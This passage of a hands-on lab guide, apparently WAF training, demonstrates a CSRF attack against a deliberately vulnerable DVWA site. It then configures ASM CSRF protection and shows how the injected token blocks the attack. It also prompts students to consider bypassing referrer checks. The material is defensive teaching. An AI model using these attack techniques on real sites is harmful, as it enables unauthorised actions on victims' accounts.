   **admin** / **password**.

-  Open another tab and access http://www.badkitties.com.

-  Click **Demo**.

This is a (ridiculously) simple webpage that has two links, **Bad
Kitty** and **Good Kitty**. Bad Kitty is a CSRF link to the unprotected
DVWA URL. Good Kitty is a CSRF link to the protected DVWA URL.

This is intended to mimic a real-word malicious page/link that sends a
request to another URL where the user MAY be authenticated, executing an
action the user did not intend; a CSRF attack.

-  Click on **Bad Kitty**.

Questions:

What “unintended” action was taken?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

At what URL was this action taken?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

Why was this action successful?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

-  Click the **Back** button until you return to the **Bad Kitties**
   page.

-  In the DVWA tab click **Logout**, and then attempt to log back in as
   **admin** / **password**.

-  On the Bad Kitties tab, mouse over **Bad Kitty** and see if you can
   identify what the **admin** password was changed to.

-  In the DVWA tab, log in as admin and the new password.

-  In the left menu click **CSRF** and use this page to change the
   password back to **password**, and then close both tabs.

Exercise 2 – Configure CSRF Protection and Attack a Protected URL
=================================================================

Task 1 – Create a Security Policy
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  In the Configuration Utility, open the **Security > Application
       Security > Security Policies > Policy List** page.

-  Click the **Create** button, and then select the **Advanced**
       settings.

   |image67|

-  Use the following information for the new policy, and then click
       **Create Policy**.

+----------------------------+-----------------------------------+
| **Policy Name**            | DVWA-Protected                    |
+============================+===================================+
| **Policy Template**        | Comprehensive (click **OK**)      |
+----------------------------+-----------------------------------+
| **Virtual Server**         | DVWA\_protected\_virtual (HTTP)   |
+----------------------------+-----------------------------------+
| **Application Language**   | Unicode (utf-8)                   |
+----------------------------+-----------------------------------+

-  Once the policy is created, click the link for **DVWA-Protected**.

   |image68|

-  Change the **Enforcement Readiness Period** to **0** days, then click
       **Save**.

Task 2 – Configure CSRF Protection
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  Open the **Security > Application Security > CSRF Protection** page.

-  Ensure you are viewing the settings for **DVWA-Protected
   (blocking)**.

   |image69|

-  Select the **CSRF Protection** checkbox.

-  Select the **\*** checkbox, and then click **Delete**.

   |image70|

We’re removing the wildcard because we only want to inject the
JavaScript needed to generate the CSRT token on the change password
page.

-  Change from **Simple Edit Mode** to **Advanced Edit Mode**.

-  For the new URL, from the **Method** list select **GET**, and for
   **URL** copy and paste **/vulnerabilities/csrf/**, and then click
   **Add**.

   |image71|

-  Review the options for **Required Parameters**.

You now have the ability as part of CSRF protection to require specific
parameters

-  Review the options for **Enforcement Action**.

In previous versions, ASM protected URLs from CSRF attacks by use of a
CSRT token that was generated by injected JavaScript. You now can
provide CSRF protections for applications that may not be able to use
JavaScript injection by verifying the existence and value of the origin
HTTP header

-  Leave both **Required Parameters** and **Enforcement Options** set to
   the default values and click **Save**, then click **Apply Policy**
   and then **OK**.

Task 3 – Attempt a CSRF Attack on the Protected Web Site
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  Open Firefox and access http://protected.f5demo.com and log in as
   **admin** / **password**.

-  Open another tab and access http://www.badkitties.com, and then click
   **Demo**.

-  Click on **Good Kitty**.

Questions:

Was the CSRF attack successful?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

Why or why not?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

-  Close both tabs.

-  In the Configuration Utility, open the **Security > Event Logs >
   Application > Requests** page.

Question:

What is the **Attack Type**?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

-  Click **CSRF attack detected**.

Questions:

What is the **Violation Reason**?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

What is the **Enforcement Action**?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

Task 4 – Examine the Presence of CSRF Protection
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  | Open Firefox and access http://unprotected.f5demo.com and log in as
     **admin** / **password**, and then
   | click **CSRF**.

-  | Open another tab and access http://protected.f5demo.com and log in
     as **admin** / **password**, and then
   | click **CSRF**.

-  In the unprotected DVWA tab, right-click on the **Change** button and
   select **Inspect Element**.

   |image72|

-  In the protected DVWA tab, right-click on the **Change** button and
   select **Inspect Element**.

Question:

What is different in the protected DVWA page?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

This is the cross-site request token (csrt) injected into the page by
ASM.

-  In the developer tools window select the **Network** tab, then click
   the trash can icon to delete any current requests.

   |image73|

-  Enter **password** into both fields to change the password, and then
   click **Change**.

-  | In the **Network** tab select the
     **/vulnerabilities/csrf/?password…** entry, and then examine
   | the **Params** tab.

   |image74|

Questions:

How many parameters were included in this request?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

What are the last four digits of the **csrt** parameter value?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

-  | Open Chrome and access http://protected.f5demo.com and log in as
     **admin** / **password**, and then
   | click **CSRF**.

-  Right-click on the **Change** button and select **Inspect**.

-  In the developer tools window select the **Network** tab.

-  Enter **password** into both fields to change the password, and then
   click **Change**.

-  In the **Network** tab select the
   **/vulnerabilities/csrf/?password…** entry, and in the **Headers**
   tab scroll down to the **Query String Parameters** section.

Questions:

| Are the last four digits of the **csrt** parameter the same as the one
  from Firefox?
| \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

| What does that tell you about the CSRT token for each session /
  browser?
| \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

How does this mitigate CSRF attacks?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

Many WAFs simply look at validating the referrer header in the request.
How could this approach be circumvented?

-  Close the Chrome and Firefox windows.

.. |image0| image:: media/image1.emf
   :width: 1.41042in
   :height: 1.10556in
.. |image1| image:: media/image3.png
   :width: 5.26247in
   :height: 2.96040in
.. |image2| image:: media/image4.png
   :width: 4.88119in
   :height: 3.55415in
.. |image3| image:: media/image5.png
   :width: 2.59189in
   :height: 0.82507in
.. |image4| image:: media/image6.png
   :width: 3.26667in
   :height: 1.04594in
.. |image5| image:: media/image7.png
   :width: 6.41667in
   :height: 0.76858in
.. |image6| image:: media/image8.png
   :width: 2.81691in
   :height: 2.18352in
.. |image7| image:: media/image9.png
   :width: 3.59198in
   :height: 0.77507in
.. |image8| image:: media/image10.png
   :width: 2.72524in
   :height: 0.55005in
.. |image9| image:: media/image11.png
   :width: 5.80694in
   :height: 1.59167in
.. |image10| image:: media/image12.png
   :width: 4.26704in
   :height: 0.76673in
.. |image11| image:: media/image13.png
   :width: 3.31667in
   :height: 1.09520in
.. |image12| image:: media/image14.png
   :width: 6.21667in
   :height: 1.40720in
.. |image13| image:: media/image15.png
   :width: 5.15878in
   :height: 0.65839in
.. |image14| image:: media/image16.png
   :width: 4.40833in
   :height: 1.84052in
.. |image15| image:: media/image17.png
   :width: 4.60686in
   :height: 0.90936in
.. |image16| image:: media/image18.png
   :width: 4.47539in
   :height: 0.65839in
.. |image17| image:: media/image19.png
   :width: 4.24016in
   :height: 0.46104in
.. |image18| image:: media/image20.png
   :width: 4.90065in
   :height: 0.59424in
.. |image19| image:: media/image21.png
   :width: 4.93376in
   :height: 0.80840in
.. |image20| image:: media/image22.png
   :width: 2.42500in
   :height: 1.30309in
.. |image21| image:: media/image23.png
   :width: 2.81691in
   :height: 0.93341in
.. |image22| image:: media/image24.png
   :width: 5.86718in
   :height: 0.87508in
.. |image23| image:: media/image25.png
   :width: 1.80849in
   :height: 0.93341in
.. |image24| image:: media/image26.png
   :width: 2.18518in
   :height: 1.00000in
.. |image25| image:: media/image27.png
   :width: 4.30000in
   :height: 1.26583in
.. |image26| image:: media/image28.png
   :width: 4.91987in
   :height: 0.83333in
.. |image27| image:: media/image29.png
   :width: 5.10878in
   :height: 0.86674in
.. |image28| image:: media/image30.png
   :width: 2.97500in
   :height: 1.69910in
.. |image29| image:: media/image31.png
   :width: 2.61463in
   :height: 1.52597in
.. |image30| image:: media/image32.png
   :width: 4.68374in
   :height: 0.53338in
.. |image31| image:: media/image33.png
   :width: 6.16667in
   :height: 1.60120in
.. |image32| image:: media/image34.png
   :width: 0.21181in
   :height: 0.23333in
.. |image33| image:: media/image35.png
   :width: 0.19167in
   :height: 0.19167in
.. |image34| image:: media/image36.png
   :width: 5.72500in
   :height: 1.47036in
.. |image35| image:: media/image37.png
   :width: 6.05000in
   :height: 0.40230in
.. |image36| image:: media/image38.png
   :width: 3.39167in
   :height: 1.47432in
.. |image37| image:: media/image39.png
   :width: 4.05035in
   :height: 0.37503in
.. |image38| image:: media/image40.png
   :width: 5.46667in
   :height: 2.00087in
.. |image39| image:: media/image41.png
   :width: 2.46688in
   :height: 0.79174in
.. |image40| image:: media/image42.png
   :width: 1.99184in
   :height: 0.59172in
.. |image41| image:: media/image43.png
   :width: 5.78333in
   :height: 1.47744in
.. |image42| image:: media/image44.png
   :width: 2.92525in
   :height: 0.40837in
.. |image43| image:: media/image45.png
   :width: 3.35000in
   :height: 1.09869in
.. |image44| image:: media/image46.png
   :width: 4.09167in
   :height: 2.91549in
.. |image45| image:: media/image47.png
   :width: 6.00052in
   :height: 0.78340in
.. |image46| image:: media/image48.png
   :width: 5.36713in
   :height: 0.33336in
.. |image47| image:: media/image49.png
   :width: 2.26686in
   :height: 1.26678in
.. |image48| image:: media/image50.png
   :width: 4.94210in
   :height: 0.91675in
.. |image49| image:: media/image51.png
   :width: 5.00347in
   :height: 0.28635in
.. |image50| image:: media/image52.png
   :width: 1.23953in
   :height: 1.18831in
.. |image51| image:: media/image53.png
   :width: 5.62500in
   :height: 1.04542in
.. |image52| image:: media/image54.png
   :width: 6.31667in
   :height: 0.50461in
.. |image53| image:: media/image55.png
   :width: 2.40854in
   :height: 1.34178in
.. |image54| image:: media/image56.png
   :width: 3.61698in
   :height: 0.61672in
.. |image55| image:: media/image57.png
   :width: 6.13386in
   :height: 0.78340in
.. |image56| image:: media/image58.png
   :width: 2.41688in
   :height: 0.34170in
.. |image57| image:: media/image59.png
   :width: 5.75833in
   :height: 1.01618in
.. |image58| image:: media/image60.png
   :width: 6.23333in
   :height: 1.56570in
.. |image59| image:: media/image61.png
   :width: 1.20010in
   :height: 1.27511in
.. |image60| image:: media/image62.png
   :width: 5.83384in
   :height: 0.33336in
.. |image61| image:: media/image63.png
   :width: 4.14203in
   :height: 0.55838in
.. |image62| image:: media/image64.png
   :width: 3.99201in
   :height: 1.11676in
.. |image63| image:: media/image65.png
   :width: 4.50000in
   :height: 2.04476in
.. |image64| image:: media/image66.png
   :width: 4.51667in
   :height: 1.79440in
.. |image65| image:: media/image67.png
   :width: 3.57500in
   :height: 2.15407in
.. |image66| image:: media/image68.png
   :width: 5.37500in
   :height: 2.63652in
.. |image67| image:: media/image69.png
   :width: 1.17510in
   :height: 0.68339in
.. |image68| image:: media/image70.png
   :width: 3.43363in
   :height: 0.46671in
.. |image69| image:: media/image71.png
   :width: 2.84191in
   :height: 0.53338in
.. |image70| image:: media/image72.png
   :width: 4.33371in
   :height: 1.39179in
.. |image71| image:: media/image73.png
   :width: 6.31986in
   :height: 1.10000in
.. |image72| image:: media/image74.png
   :width: 3.43363in
   :height: 0.47504in
.. |image73| image:: media/image75.png
   :width: 6.18333in
   :height: 0.68880in
.. |image74| image:: media/image76.png
   :width: 6.32500in
   :height: 1.25790in
